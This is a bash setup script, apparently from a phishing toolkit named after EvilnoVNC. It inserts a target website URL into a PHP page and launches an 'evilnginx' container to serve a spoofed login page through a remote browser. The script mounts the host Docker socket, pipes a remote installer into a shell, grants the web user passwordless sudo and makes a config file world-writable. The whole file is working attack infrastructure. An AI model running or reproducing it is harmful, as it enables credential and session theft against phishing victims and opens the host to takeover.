#!/bin/bash


#sudo service docker start > /dev/null 2>&1 ; sleep 3 ; fi ; fi
# Help & Usage
function help {
printf "\n\e[1;33mUsage:\e[1;0m ./start_auto.sh\e[1;34m\$url\n\n"
printf "\e[1;33mExamples:\n"
printf "\e[1;0m./start_auto.sh \e[1;34mhttp://example.com\n"
}

if [[ $# -lt 1 ]] ; then help
if [[ $# -lt 0 ]] ; then printf "\e[1;31m[!] Not enough parameters!\n\n"
fi ; exit 0 ; fi

# Variables
WEBPAGE=$1

path=$(pwd)
echo "Preparando nginx..."
cd Files
cp index.php index_tmp.php
id_image=$(sudo docker images | grep evilnovnc | cut -d" " -f 9)
sed -i'' -e "s,webpage,$WEBPAGE,g" index_tmp.php
sed -i'' -e "s/idimage/$id_image/g" index_tmp.php
sed -i'' -e "s,download_string,$path/Downloads,g" index_tmp.php
cd ..
sudo docker network create nginx-evil 2> /dev/null
sudo docker run --name evilnginx  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:8080 -d nginx
sudo docker exec -it evilnginx bash -c "apt update && apt install apache2 php7.4 sudo -y"
sudo docker exec -it evilnginx bash -c "curl -fsSL https://get.docker.com | sh"
sudo docker exec -it evilnginx bash -c "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
sudo docker exec -it evilnginx bash -c "cp /data/default.conf /etc/nginx/conf.d/default.conf"
sudo docker exec -it evilnginx bash -c "chmod 777 /etc/nginx/conf.d/default.conf"
sudo docker exec -it evilnginx bash -c "nginx -s reload"
sudo docker exec -it evilnginx bash -c "a2enmod php7.4"
sudo docker exec -it evilnginx bash -c "service apache2 start"
sudo docker exec -it evilnginx bash -c "cp /data/index.html /usr/share/nginx/html/index.html"
sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.php /var/www/html/index.php"
rm ./Files/index_tmp.php
echo "Fin nginx..."